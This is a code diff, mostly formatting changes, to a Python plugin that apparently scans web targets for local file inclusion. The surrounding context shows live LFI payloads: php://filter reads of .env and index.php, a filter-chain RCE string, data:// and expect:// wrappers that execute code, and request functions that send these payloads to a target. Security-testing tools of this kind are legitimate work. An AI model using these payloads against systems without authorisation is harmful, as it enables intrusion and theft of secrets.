@@ -1,13 +1,37 @@
 # plugins/lfi_scanner.py — Cascavel 2026 Intelligence
-import requests
 import urllib.parse
 
+import requests
 
 PARAMS = [
-    "file", "page", "path", "include", "template", "doc", "folder", "view",
-    "content", "cat", "dir", "action", "board", "date", "detail", "download",
-    "module", "controller", "func", "load", "filename", "document",
-    "attachment", "report", "img", "image", "lang", "locale",
+    "file",
+    "page",
+    "path",
+    "include",
+    "template",
+    "doc",
+    "folder",
+    "view",
+    "content",
+    "cat",
+    "dir",
+    "action",
+    "board",
+    "date",
+    "detail",
+    "download",
+    "module",
+    "controller",
+    "func",
+    "load",
+    "filename",
+    "document",
+    "attachment",
+    "report",
+    "img",
+    "image",
+    "lang",
+    "locale",
 ]
 
 LINUX_INDICATOR = "root:"
@@ -44,7 +68,11 @@ PHP_WRAPPER_PAYLOADS = [
     ("php://filter/convert.base64-encode/resource=.env", "PD9w", "PHP_FILTER_ENV"),
     ("php://filter/read=string.rot13/resource=index.php", "<?cuc", "PHP_FILTER_ROT13"),
     # PHP filter chain RCE (2025-2026 technique)
-    ("php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=index.php", "", "PHP_FILTER_CHAIN"),
+    (
+        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=index.php",
+        "",
+        "PHP_FILTER_CHAIN",
+    ),
     ("php://input", "", "PHP_INPUT"),
     ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "phpinfo", "DATA_WRAPPER"),
     ("expect://id", "uid=", "EXPECT_WRAPPER"),
@@ -138,9 +166,12 @@ def _test_lfi_get(target, param, payloads):
             if resp.status_code == 200 and indicator and indicator in resp.text:
                 sev, desc = _classify_severity(method)
                 return {
-                    "tipo": "LFI", "parametro": param,
-                    "payload": payload[:80], "metodo": method,
-                    "severidade": sev, "descricao": desc,
+                    "tipo": "LFI",
+                    "parametro": param,
+                    "payload": payload[:80],
+                    "metodo": method,
+                    "severidade": sev,
+                    "descricao": desc,
                     "amostra": resp.text[:200],
                 }
         except Exception:
@@ -155,8 +186,10 @@ def _test_lfi_post(target, param):
             resp = requests.post(f"http://{target}/", data={param: payload}, timeout=6)
             if indicator and indicator in resp.text:
                 return {
-                    "tipo": "LFI_POST", "parametro": param,
-                    "payload": payload[:60], "metodo": method,
+                    "tipo": "LFI_POST",
+                    "parametro": param,
+                    "payload": payload[:60],
+                    "metodo": method,
                     "severidade": "ALTO",
                 }
         except Exception:
@@ -177,11 +210,14 @@ def _test_path_in_url(target):
         try:
             resp = requests.get(f"http://{target}{path}", timeout=6)
             if LINUX_INDICATOR in resp.text:
-                vulns.append({
-                    "tipo": "LFI_PATH_URL", "path": path[:60],
-                    "severidade": "CRITICO",
-                    "descricao": "LFI via URL path traversal!",
-                })
+                vulns.append(
+                    {
+                        "tipo": "LFI_PATH_URL",
+                        "path": path[:60],
+                        "severidade": "CRITICO",
+                        "descricao": "LFI via URL path traversal!",
+                    }
+                )
                 break
         except Exception:
             continue
@@ -237,8 +273,17 @@ def run(target, ip, open_ports, banners):
     return {
         "plugin": "lfi_scanner",
         "versao": "2026.1",
-        "tecnicas": ["traversal", "php_wrappers", "filter_chain_rce", "proc_fs",
-                      "log_poisoning", "sensitive_files", "null_byte", "encoding_bypass",
-                      "path_url", "post_body"],
+        "tecnicas": [
+            "traversal",
+            "php_wrappers",
+            "filter_chain_rce",
+            "proc_fs",
+            "log_poisoning",
+            "sensitive_files",
+            "null_byte",
+            "encoding_bypass",
+            "path_url",
+            "post_body",
+        ],
         "resultados": vulns if vulns else "Nenhum LFI detectado",
     }
